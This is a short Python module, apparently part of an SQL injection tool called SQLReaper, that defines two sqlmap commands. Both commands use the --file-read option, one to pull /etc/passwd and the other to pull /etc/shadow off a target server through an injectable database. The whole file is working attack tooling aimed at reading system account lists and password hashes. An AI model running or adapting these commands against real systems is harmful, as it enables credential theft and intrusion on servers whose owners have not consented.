"""OS file access module for SQLReaper — 2 commands."""
from __future__ import annotations

from typing import Dict, List

from core.config import ScanConfig
from core.builder import base_flags
from utils.banner import WHITE


def get_commands(cfg: ScanConfig) -> List[Dict]:
    """Return OS file access command definitions.

    Args:
        cfg: Resolved scan configuration.

    Returns:
        List of command definition dicts.
    """
    b = base_flags(cfg)
    return [
        {
            "label": "Read File: /etc/passwd",
            "tag": "OS",
            "tag_color": WHITE,
            "cmd": ["sqlmap"] + b + ["--file-read=/etc/passwd"],
        },
        {
            "label": "Read File: /etc/shadow",
            "tag": "OS",
            "tag_color": WHITE,
            "cmd": ["sqlmap"] + b + ["--file-read=/etc/shadow"],
        },
    ]
